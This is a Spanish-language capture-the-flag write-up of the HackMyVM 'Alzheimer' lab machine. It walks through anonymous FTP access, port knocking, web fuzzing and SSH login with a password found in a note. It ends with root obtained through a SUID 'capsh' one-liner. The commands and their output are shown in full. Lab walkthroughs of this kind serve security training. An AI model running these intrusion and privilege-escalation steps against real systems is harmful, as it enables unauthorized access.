---
layout: single
title: Alzheimer - HackMyVM
excerpt: "En este post vamos a realizar una maquina de la plataforma de HackMyVM que se llama Alzheimer vamos de primeras solo vamos a ver abierto el puerto 21 que corresponde a ftp nos vamos a descargar un .txt donde vamos a encontrar informacion despues de eso vamos aplicar port knocking para abrir puertos y asi poder continuar con la maquina nos vamos a conectar por ssh ala maquina y para elevar privilegios nos vamos aprovechar de un binario SUID para ser root."
toc: true
toc_label: "Contenido"
toc_icon: "fire"
date: 2023-05-03
classes: wide
header:
  teaser: /assets/images/hvm-writeup-alzheimer/icon.png
  teaser_home_page: true
  icon: /assets/images/hackvm.webp
categories:
  - HackMyVM
  - infosec
tags:  
  - FTP Enumeration
  - Port knocking
  - SUID privilege

---
<p align="center">
<img src="/assets/images/hvm-writeup-alzheimer/icon.png">
</p>

En mi caso importe la maquina en `vmware` y tube que cambiar la interfaz de red en el archivo `interfaces` de la maquina una vez hecho esto podemos aplicar un reconocimiento en nuestra red local por la interfaz `ens33` que es mi caso.

```bash
❯ arp-scan -I ens33 --localnet --ignoredups
Interface: ens33, type: EN10MB, MAC: 00:0c:29:48:8f:7e, IPv4: 192.168.100.44
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.100.45	00:0c:29:38:8b:eb	VMware, Inc.
```

```bash
❯ ping -c 1 192.168.100.45
PING 192.168.100.45 (192.168.100.45) 56(84) bytes of data.
64 bytes from 192.168.100.45: icmp_seq=1 ttl=64 time=0.638 ms

--- 192.168.100.45 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.638/0.638/0.638/0.000 ms
❯ whichSystem.py 192.168.100.45

192.168.100.45 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p21 192.168.100.45 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 10:44 CST
Nmap scan report for 192.168.100.45
Host is up (0.00043s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
MAC Address: 00:0C:29:38:8B:EB (VMware)
Service Info: OS: Unix
```

## Enumeracion 

Solo tenemos el puerto `21` abierto que corresponde al servicio `FTP` **FIle Transfer Protocol** que `nmap` nos reporto que podemos usar el usuario `anonymous` sin proporcionar contraseña ya que `nmap` en el escaneo lanzo este script

```bash
❯ locate ftp-anon.nse
/usr/share/nmap/scripts/ftp-anon.nse
```

Ahora lo que vamos a hacer es conectarnos al servicio `FTP` ya que es el unico puerto abierto

```bash
❯ ftp 192.168.100.45
Connected to 192.168.100.45.
220 (vsFTPd 3.0.3)
Name (192.168.100.45:miguel7): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
```

Vemos un solo archivo asi que vamos a descargarlo 

```bash
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Oct 03  2020 .
drwxr-xr-x    2 0        113          4096 Oct 03  2020 ..
-rw-r--r--    1 0        0              70 Oct 03  2020 .secretnote.txt
226 Directory send OK.
ftp> get .secretnote.txt
local: .secretnote.txt remote: .secretnote.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for .secretnote.txt (70 bytes).
226 Transfer complete.
70 bytes received in 0.02 secs (2.9426 kB/s)
ftp> 
```

Esto es el contenido y al parecer toda esa data puede ser una contraseña 

```bash
❯ catn .secretnote.txt
I need to knock this ports and 
one door will be open!
1000
2000
3000
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
Ihavebeenalwayshere!!!
```

Bueno ya sabemos que tenemos que hacer **Port knocking*** que es para abrir los puertos y poder verlos <https://en.wikipedia.org/wiki/Port_knocking> por reglas de `iptables` estos puertos estan cerrados <https://eltallerdelbit.com/que-es-iptables/>

## Port knocking

Para abrir los puertos que nos indican vamos a golpear los puertos con la herramienta `knock` , si tienes errores por que estas en `vmware` cambia la interfaz de red del archivo `knockd.conf` a tu interfaz de red una vez hecho eso si los puertos no se habren aplica el comando varias veces 

```bash
❯ knock -v 192.168.100.45 1000 2000 3000
hitting tcp 192.168.100.45:1000
hitting tcp 192.168.100.45:2000
hitting tcp 192.168.100.45:3000
```

Ahora tenemos los puertos abiertos 

```bash
❯ nmap -sCV -p21,22,80 192.168.100.45 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-03 11:30 CST
Nmap scan report for 192.168.100.45
Host is up (0.00033s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.44
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b13b2b36e56bd72a6defbfda0a5d2d43 (RSA)
|   256 35f170aba366f1d6d72cf7d1247a5f2b (ECDSA)
|_  256 be15fab681d67fabc81c97a5ea11854e (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: nginx/1.14.2
MAC Address: 00:0C:29:38:8B:EB (VMware)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

``` 

## Enumeracion 2 

Como el puerto `80` ya esta abierto podemos ver los servicios que corre la pagina web 

```lua
❯ whatweb http://192.168.100.45
http://192.168.100.45 [200 OK] Country[RESERVED][ZZ], HTTPServer[nginx/1.14.2], IP[192.168.100.45], nginx[1.14.2]
```

Esta es la pagina web y nos dicen que no recuerda donde puso su contraseña que solo recuerda que la puso en un archivo `.txt` si recuerdan en el archivo que nos descargamos por `ftp` solo tenemos ese archivo pero podemos hacer fuzzing para ver si hay algun otro 

![](/assets/images/hvm-writeup-alzheimer/web1.png)

## Fuzzing 

```bash
❯ feroxbuster -t 200 -x php,txt,html -u http://192.168.100.45

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.3.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.100.45
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.3.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [php, txt, html]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        7l       12w      185c http://192.168.100.45/home
301        7l       12w      185c http://192.168.100.45/admin
200        2l        7w       34c http://192.168.100.45/home/index.html
301        7l       12w      185c http://192.168.100.45/secret
301        7l       12w      185c http://192.168.100.45/secret/home
200        1l        8w       44c http://192.168.100.45/secret/index.html
200        2l       13w       62c http://192.168.100.45/secret/home/index.html
[####################] - 2m    599980/599980  0s      found:7       errors:217    
[####################] - 2m    119996/119996  833/s   http://192.168.100.45
[####################] - 2m    119996/119996  831/s   http://192.168.100.45/home
[####################] - 2m    119996/119996  830/s   http://192.168.100.45/admin
[####################] - 2m    119996/119996  835/s   http://192.168.100.45/secret
[####################] - 2m    119996/119996  836/s   http://192.168.100.45/secret/home
```

Este es el contenido del archivo

```bash
❯ curl http://192.168.100.45/home/index.html
Maybe my pass is at home!
-medusa
```

Nos dan otra pista

```bash
❯ curl -L http://192.168.100.45/secret
Maybe my password is in this secret folder?
```

## SSH medusa

Pero bueno podemos probar el usuario `medusa:Ihavebeenalwayshere!!!` y esa contraseña que fue la que encontramos en el `.txt` de `ftp` y al ser el unico archivo `.txt` podemos probarla 

```bash
❯ ssh medusa@192.168.100.45
The authenticity of host '192.168.100.45 (192.168.100.45)' can't be established.
ECDSA key fingerprint is SHA256:wWRc6/Q965DMK5vCXDfkS7wisnO/kkBLzA+WjYjEIzg.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.100.45' (ECDSA) to the list of known hosts.
medusa@192.168.100.45's password: 
Linux alzheimer 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sat Oct  3 06:00:36 2020 from 192.168.1.58
medusa@alzheimer:~$
medusa@alzheimer:~$ export TERM=xterm
``` 

## User flag 

![](/assets/images/hvm-writeup-alzheimer/web2.png) 

## Escalada de privilegios 

Podemos ejecutar como cualquier usuario sin proporcionar contraseña este comando 

```bash
medusa@alzheimer:~$ sudo -l
Matching Defaults entries for medusa on alzheimer:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User medusa may run the following commands on alzheimer:
    (ALL) NOPASSWD: /bin/id
medusa@alzheimer:~$ sudo -u root /bin/id
uid=0(root) gid=0(root) groups=0(root)
medusa@alzheimer:~$ 
``` 

Pero bueno ver ficheros `SUID` 

```bash
medusa@alzheimer:/$ find \-perm -4000 -ls 2>/dev/null
     1249     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 ./usr/lib/dbus-1.0/dbus-daemon-launch-helper
    15846    428 -rwsr-xr-x   1 root     root         436552 Jan 31  2020 ./usr/lib/openssh/ssh-keysign
   137057     12 -rwsr-xr-x   1 root     root          10232 Mar 28  2017 ./usr/lib/eject/dmcrypt-get-device
       60     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 ./usr/bin/chsh
     8850    156 -rwsr-xr-x   1 root     root         157192 Feb  2  2020 ./usr/bin/sudo
     3888     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 ./usr/bin/mount
     3415     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 ./usr/bin/newgrp
     3562     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 ./usr/bin/su
       63     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 ./usr/bin/passwd
       59     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 ./usr/bin/chfn
     3890     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 ./usr/bin/umount
       62     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 ./usr/bin/gpasswd
     5584     28 -rwsr-sr-x   1 root     root          26776 Feb  6  2019 ./usr/sbin/capsh
medusa@alzheimer:/$ 
```

El binario `./usr/sbin/capsh` ya llama la atencion si vamos a GTFObins ya vemos que podemos elevar nuestro privilegio <https://gtfobins.github.io/gtfobins/capsh/#suid> 

```bash
medusa@alzheimer:/$ /usr/sbin/capsh --gid=0 --uid=0 --
root@alzheimer:/# 
``` 

## Root flag 

![](/assets/images/hvm-writeup-alzheimer/web3.png)


